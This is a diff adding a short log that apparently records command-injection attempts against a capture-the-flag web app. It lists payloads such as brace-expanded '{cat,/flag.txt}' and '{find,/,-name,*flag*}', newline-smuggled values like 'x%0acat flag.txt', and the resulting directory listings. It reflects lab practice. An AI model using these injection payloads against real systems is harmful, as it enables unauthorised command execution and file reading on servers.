@@ -1,0 +1,32 @@
+{cat,/flag.txt}:
+{ls,/}:
+{ls -la,/}:
+{find,/,-name,*flag*}:
+{find,/,-name,*flag*}:
+{find,/,-name,*flag*}:
+id:id
+ls:id
+find,/,-name,*flag*:find,/,-name,*flag*
+{find,/,-name,*flag*}::{find,/,-name,*flag*}:
+cat:/flag.txt
+cat:/flag.txt
+Dockerfile app.py logs.txt requirements.txt static templates:Dockerfile app.py logs.txt requirements.txt static templates
+test:xncat flag.txt
+test:xnls /
+test:x%0acat flag.txt
+x%0acat flag.txt:x%0acat flag.txt
+Dockerfile
+app.py
+logs.txt
+requirements.txt
+solved.py
+static
+templates
+Dockerfile
+app.py
+logs.txt
+requirements.txt
+solved.py
+static
+templates
+xncat .flag.txt:xncat .flag.txt
